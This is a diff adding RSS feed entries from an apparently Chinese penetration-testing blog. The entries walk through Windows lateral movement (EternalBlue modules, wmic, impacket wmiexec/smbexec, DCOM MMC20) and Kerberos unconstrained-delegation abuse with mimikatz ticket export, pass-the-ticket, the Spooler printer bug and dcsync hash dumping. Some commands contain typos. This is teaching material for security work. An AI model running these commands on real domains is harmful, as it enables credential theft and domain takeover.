+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;永恒之蓝&#34;&gt;永恒之蓝&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;auxiliary/scanner/smb/smb_ms17_010
+auxiliary/admin/smb/ms17_010_command
+exploit/windows/smb/ms17_010_eternalblue
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;wmi&#34;&gt;WMI&lt;/h2&gt;
+&lt;h3 id=&#34;基本使用&#34;&gt;基本使用&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic /node:IP /user:administrator /password:passed process call create &amp;quot;cmd.exe /c ipconfig &amp;gt; ip.txt&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;建立IPC，使用type命令读取结果&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;type \\IP\C$\ip.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;impacket-包中的-wmiexec&#34;&gt;impacket 包中的 wmiexec&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python wmiexec.py administrator:password@IP
+
+# 如果没有密码，也可以配合哈希传递
+wmiexec.py -hashes
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;smbexec&#34;&gt;smbexec&lt;/h2&gt;
+&lt;h3 id=&#34;impacket-版&#34;&gt;impacket 版&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 smbexec.py teamssix.com/administrator:1qaz@WSX@192.168.7.7
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;linux-跨平台-windows-远程命令执行&#34;&gt;Linux 跨平台 Windows 远程命令执行&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/brav0hax/smbexec&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/brav0hax/smbexec&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;dcom&#34;&gt;DCOM&lt;/h2&gt;
+&lt;p&gt;DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上，利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。&lt;/p&gt;
+&lt;h3 id=&#34;本地执行任意命令&#34;&gt;本地执行任意命令&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;获取 DCOM 程序列表&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# windows server 2012 及以上
+Get-CimInstance Win32_DCOMApplicatioon
+
+# Windows 7、Windows Server 2008
+Get-WmicObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;执行任意命令&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 本地管理员powershell下执行
+[System.Activator]::CreateInstance([type]::GetTypeFromProgID(&amp;quot;MMC20.Application&amp;quot;,&amp;quot;127.0.0.1&amp;quot;)).Document.ActiveView.ExecuteShellCommand(&amp;quot;cmd.exe&amp;quot;,&amp;quot;0&amp;quot;,&amp;quot;/c calc.exe&amp;quot;,&amp;quot;Minimzed&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;远程主机上执行命令&#34;&gt;远程主机上执行命令&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;IPC连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net use \\IP &amp;quot;password&amp;quot; /user:pentest.hacker\win7user
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;执行命令&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 调用 MMC20_Application 远程执行命令
+$com=[Activator]::CreateInstance([type]::GetTypeFromProgID(&amp;quot;MMC20.Application&amp;quot;,&amp;quot;IP&amp;quot;))
+$com.Document.ActiveView.ExecuteShellCommand(&amp;quot;cmd.exe&amp;quot;,&amp;quot;0&amp;quot;,&amp;quot;/c calc.exe&amp;quot;,&amp;quot;Minimzed&amp;quot;)
+
+
+# 调用9BA05972-F6A8-11CF-A442-00A0C90A8F39
+$com=[Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&amp;quot;IP&amp;quot;)
+$obj=[System.Activator]::CreateInstance($com)
+$item=$obj.item()
+$item.Document.Application.ShellExecute(&amp;quot;cmd.exe&amp;quot;,&amp;quot;/c calc.exe&amp;quot;,&amp;quot;c:\windows\system32&amp;quot;,&amp;quot;$null&amp;quot;,0)
+&lt;/code&gt;&lt;/pre&gt;</description>
+        </item>
+        <item>
+        <title>基于域委派的攻击</title>
+        <link>https://coollllllll.github.io/p/intranet-13/</link>
+        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/intranet-13/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/intranet-13/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 基于域委派的攻击" /&gt;&lt;h1 id=&#34;基于域委派的攻击&#34;&gt;基于域委派的攻击&lt;/h1&gt;
+&lt;h2 id=&#34;定义&#34;&gt;定义&lt;/h2&gt;
+&lt;h3 id=&#34;委派&#34;&gt;委派&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Identity delegation is a feature of Active Directo ry Federation Services (AD FS) that allows administrator-specified accounts to impersonate users. The account that impersonates the user is called the dele gate
+
+This delegation capability is critical for many distributed applications for which there is a series of access control checks that must be made sequentially for each application, database, or service that is in the authorization chain for the originating request
+
+Many real-world scenarios exist in which a Web application “front end” must retrieve data from a more secure “back end”, such as a Web service that is connected to a Microsoft SQL Server database.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用委派可获取域管理员权限，甚至制作深度隐藏的后门。&lt;/p&gt;
+&lt;p&gt;域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。&lt;/p&gt;
+&lt;p&gt;服务账号(&lt;code&gt;Service Account&lt;/code&gt;)，域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如 &lt;code&gt;MS SQL Server&lt;/code&gt; 在安装时，会在域内自动注册服务账号 &lt;code&gt;SqlServiceAccount&lt;/code&gt;，这类账号不能用于交互式登录。&lt;/p&gt;
+&lt;h3 id=&#34;多跳认证和委派的流程&#34;&gt;多跳认证和委派的流程&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;多跳认证示意图：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 181; 
+			flex-basis: 435px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220312232633308.png&#34; data-size=&#34;970x535&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220312232633308.png&#34;
+			width=&#34;970&#34;
+			height=&#34;535&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220312232633308_hu205c284eaaaf866791cc70363f1279ae_120151_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220312232633308_hu205c284eaaaf866791cc70363f1279ae_120151_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;流程：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;域内用户 jack 以 Kerberos 方式认证后(先向 DS 进行常规的 kerberos 认证，获取 Web 服务器的访问权限)访问 Web 服务器&lt;/li&gt;
+&lt;li&gt;Web 服务以 websvc 服务账号运行，websvc 向 KDC 发起 jack 用户的票据申请&lt;/li&gt;
+&lt;li&gt;KDC 检查 websvc 用户的委派属性，如果被设置，则返回 jack 用户的可转发票据 TGT&lt;/li&gt;
+&lt;li&gt;websvc 收到 jack 用户 TGT 后，使用该票据向 KDC 申请访问文件服务器的服务票据 TGS&lt;/li&gt;
+&lt;li&gt;KDC 检查 websvc 的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个 jack 用户访问文件服务的授权票据 TGS&lt;/li&gt;
+&lt;li&gt;websvc 收到的 jack 用户的授权票据 TGS 后，可访问文件服务，完成多跳认证。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;委派分类&#34;&gt;委派分类&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;非约束委派(Unconstrained Delegation)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户访问任意服务。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;约束性委派(Constrained Delegation)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Kerberos 的扩展协议 &lt;code&gt;S4U2Proxy&lt;/code&gt;，服务账号只能获取某用户的 &lt;code&gt;TGS&lt;/code&gt;，从而只能模拟用户访问特定的服务。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 85; 
+			flex-basis: 205px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220312234816265.png&#34; data-size=&#34;767x897&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220312234816265.png&#34;
+			width=&#34;767&#34;
+			height=&#34;897&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220312234816265_hu710bf613b72f134f0414698af399a466_469742_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220312234816265_hu710bf613b72f134f0414698af399a466_469742_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;非约束委派&#34;&gt;非约束委派&lt;/h2&gt;
+&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 129; 
+			flex-basis: 311px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313152035356.png&#34; data-size=&#34;800x616&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313152035356.png&#34;
+			width=&#34;800&#34;
+			height=&#34;616&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313152035356_hu8c8d8d8693b456944a0031f2c14ad610_228297_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313152035356_hu8c8d8d8693b456944a0031f2c14ad610_228297_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;当 &lt;code&gt;user&lt;/code&gt; 访问 &lt;code&gt;service1&lt;/code&gt; 时，如果 &lt;code&gt;service1&lt;/code&gt; 的服务账号开启了 &lt;code&gt;unconstrained delegation&lt;/code&gt;（非约束委派），则当 &lt;code&gt;user&lt;/code&gt; 访问 &lt;code&gt;service1&lt;/code&gt; 时会将 &lt;code&gt;user&lt;/code&gt; 的 &lt;code&gt;TGT&lt;/code&gt; 发送给 &lt;code&gt;service1&lt;/code&gt; 并保存在内存中以备下次重用，然后 &lt;code&gt;service1&lt;/code&gt; 就可以利用这张&lt;code&gt;TGT&lt;/code&gt; 以 &lt;code&gt;user&lt;/code&gt;的身份去访问域内的任何服务（任何服务是指&lt;code&gt;user&lt;/code&gt;能访问的服务）。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;流程如下：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用户向KDC请求可转发TGT，记为TGT1&lt;/li&gt;
+&lt;li&gt;KDC返回TGT1&lt;/li&gt;
+&lt;li&gt;用户通过TGT1向KDC请求转发TGT2&lt;/li&gt;
+&lt;li&gt;KDC返回TGT2&lt;/li&gt;
+&lt;li&gt;用户通过TGT1向KDC申请访问服务1的TGS&lt;/li&gt;
+&lt;li&gt;KDC返回TGS&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;用户发送TGS、TGT1、TGT2和TGT2的SessionKey给服务1&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;服务1通过用户的TGT2请求KDC，以用户名义请求服务2的TGS（服务访问票据）&lt;/li&gt;
+&lt;li&gt;KDC给服务1返回服务2的TGS&lt;/li&gt;
+&lt;li&gt;服务1以用户名义向服务2发出请求&lt;/li&gt;
+&lt;li&gt;服务2响应服务1的请求&lt;/li&gt;
+&lt;li&gt;服务1响应用户第7步骤的请求&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;其中&lt;code&gt;TGT2&lt;/code&gt;是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;本质：用户 A 去访问服务B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问的任意服务。&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;查找委派账号，开启委派后，在该用户的 &lt;code&gt;userAccountControl&lt;/code&gt; 属性中会包含&lt;code&gt;TRUSTED_FOR_DELEGATION&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 533; 
+			flex-basis: 1280px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313145503582.png&#34; data-size=&#34;1110x208&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313145503582.png&#34;
+			width=&#34;1110&#34;
+			height=&#34;208&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313145503582_huffa05800b7caecc26a8d9f0f1ce5a94d_103859_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313145503582_huffa05800b7caecc26a8d9f0f1ce5a94d_103859_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;实战&#34;&gt;实战&lt;/h3&gt;
+&lt;h4 id=&#34;非约束委派查找&#34;&gt;非约束委派查找&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;adfind&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;基于LDAP服务。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;查询非约束委派的主机&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;AdFind.exe -b &amp;quot;DC=pentest,DC=com&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;quot; cn distinguishedName
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 237; 
+			flex-basis: 568px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313153811163.png&#34; data-size=&#34;1114x470&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313153811163.png&#34;
+			width=&#34;1114&#34;
+			height=&#34;470&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313153811163_huc2beeb3493d89c8b865bafe3e328bd67_198961_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313153811163_huc2beeb3493d89c8b865bafe3e328bd67_198961_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;查询非约束委派的用户&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;AdFind.exe -b &amp;quot;DC=pentest,DC=com&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;quot; cn distinguishedName
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;powerview&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;查询配置非约束委派的用户&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Get-NetUser -Unconstrained -Domain pentest.com
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;查询配置非约束委派的主机&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Get-domaincomputer -Unconstrained -Domain pentest.com
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 152; 
+			flex-basis: 366px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313154620096.png&#34; data-size=&#34;1112x729&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313154620096.png&#34;
+			width=&#34;1112&#34;
+			height=&#34;729&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313154620096_hu08eadd8fb1ff64dac779f7eebd49df36_420208_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313154620096_hu08eadd8fb1ff64dac779f7eebd49df36_420208_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;PowerShell脚本枚举域内所有的服务账号，查看哪些账号被设置委派，以及何种类型的委派：&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto | f1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当一个用户具备对某个服务账号的SeEnableDelegationPrivilege权限时，表示可以更改服务账号的委派设置，一般情况下只有域管理员才具备这个权限。因此也可以利用SeEnableDelegationPrivilege属性，制作极其隐蔽的后门。&lt;/p&gt;
+&lt;h4 id=&#34;利用-管理员模拟访问&#34;&gt;利用-管理员模拟访问&lt;/h4&gt;
+&lt;p&gt;当域管理员访问目标服务账号，且该服务账号配置了非约束性委派，那么域管理员会将自己的TGT发送给该服务，并保留在机器内存中，因此攻击者可提取这台机器上缓存的TGT，从而获得域管权限，随后进行PTT攻击即可。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;模拟管理员调用非约束性委派机的 smb 服务：&lt;code&gt;net use \\win7\c$&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;在非约束性委派机上查看票据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
+sekualsa::tickets
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 134; 
+			flex-basis: 321px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313162551262.png&#34; data-size=&#34;1030x768&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313162551262.png&#34;
+			width=&#34;1030&#34;
+			height=&#34;768&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313162551262_hufa2e5439527aed45cccab9366d7b0ff6_289590_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313162551262_hufa2e5439527aed45cccab9366d7b0ff6_289590_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;导出票据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sekurlas::tickets /export
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 183; 
+			flex-basis: 440px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163303229.png&#34; data-size=&#34;646x352&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163303229.png&#34;
+			width=&#34;646&#34;
+			height=&#34;352&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163303229_hu503eda8f3cd3f7b947e804149256ec34_284910_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313163303229_hu503eda8f3cd3f7b947e804149256ec34_284910_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;当前状况下访问域控会被拒绝&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 840; 
+			flex-basis: 2018px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163355791.png&#34; data-size=&#34;513x61&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163355791.png&#34;
+			width=&#34;513&#34;
+			height=&#34;61&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163355791_hu6c60917cad7f5463abd7c1cc3b46473d_11656_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313163355791_hu6c60917cad7f5463abd7c1cc3b46473d_11656_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;mimikatz 将票据注入内存&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kerberos::ptt 票据文件名
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 196; 
+			flex-basis: 471px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163834084.png&#34; data-size=&#34;962x490&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163834084.png&#34;
+			width=&#34;962&#34;
+			height=&#34;490&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163834084_hud45c8b68877ed228a6cdc879414fa11f_167839_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313163834084_hud45c8b68877ed228a6cdc879414fa11f_167839_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h4 id=&#34;利用-spooler-printer-bug&#34;&gt;利用-Spooler Printer Bug&lt;/h4&gt;
+&lt;p&gt;实际情况下，管理员不一定会访问非约束委派服务，留下TGT。可利用非约束委派 + Spooler 打印机服务可以强制指定的主机进行连接。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;利用 Windows 打印系统远程协议 &lt;code&gt;(MS-RPRN)&lt;/code&gt; 中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN &lt;code&gt;RpcRemoteFindFirstPrinterChangeNotification(Ex)&lt;/code&gt; 方法强制任何运行了 &lt;code&gt;Spooler&lt;/code&gt; 服务的计算机以通过 &lt;code&gt;Kerberos&lt;/code&gt; 或 &lt;code&gt;NTLM&lt;/code&gt; 对攻击者选择的目标进行身份验证。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;注意：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;这种攻击需要找到一台开启非受限委派的主机账户，而非服务账户&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;POC：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/leechristensen/SpoolSample&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/leechristensen/SpoolSample&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用 &lt;code&gt;Rubeus&lt;/code&gt; 来监听 &lt;code&gt;Event ID&lt;/code&gt; 为 &lt;code&gt;4624&lt;/code&gt; 事件，即监听登录会话提取TGT&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Rubeus.exe monitor /interval:1 /filteruser:DC$
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;Rubeus.exe 捕获到的 TGT 是 base64 编码的，但是我们不需要解码，&lt;code&gt;Rubeus&lt;/code&gt;可以直接将 base64 编码的票据直接注入到内存中。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;向 DC 的 &lt;code&gt;Spooler&lt;/code&gt; 服务发送请求，强制其访问 win7 进行身份验证&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;SpoolSample.exe DC win7
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;随后进行票据导出和注入&lt;/li&gt;
+&lt;li&gt;用 &lt;code&gt;dcsync&lt;/code&gt; 导出域控中所有用户的 hash，然后用 &lt;code&gt;krbtgt&lt;/code&gt; 用户的 hash 生成黄金票据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;lsadump::dcsync /domain:test.local /all /csv
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;约束性委派&#34;&gt;约束性委派&lt;/h2&gt;
+&lt;h3 id=&#34;原理-1&#34;&gt;原理&lt;/h3&gt;
+&lt;p&gt;由于非约束委派的不安全性（配置了非约束委派的机器在 LSASS 中缓存了用户的 TGT 票据可模拟用户去访问域中任意服务），微软在 Windows Server 2003 中引入了约束委派，对 Kerberos 协议进行拓展，引入了 &lt;code&gt;S4U&lt;/code&gt; (S4U2Self / S4U2proxy)。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;S4U2self&lt;/code&gt; (Service for User to S4U2Self) 可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；如果一个&lt;strong&gt;服务账户&lt;/strong&gt;的 userAccountControl 标志为 &lt;code&gt;TRUSTED_TO_AUTH_FOR_DELEGATION&lt;/code&gt;, 则其可以&lt;strong&gt;代表任何其他用户&lt;/strong&gt;获取自身服务的 TGS/ST。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;S4U2proxy&lt;/code&gt;(Service for User to Proxy) 可以以用户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范围。服务帐户可以&lt;strong&gt;代表任何用户&lt;/strong&gt;获取在 &lt;code&gt;msDS-AllowedToDelegateTo&lt;/code&gt; 中设置的服务的 TGS/ST，首先需要从该用户到其本身的 TGS/ST，但它可以在请求另一个 TGS 之前使用 S4U2self 获得此 TGS/ST。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;约束委派的目的是在模拟用户的同时，限制委派机器/帐户对特定服务的访问。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 131; 
+			flex-basis: 315px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313170602409.png&#34; data-size=&#34;1049x797&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313170602409.png&#34;
+			width=&#34;1049&#34;
+			height=&#34;797&#34;
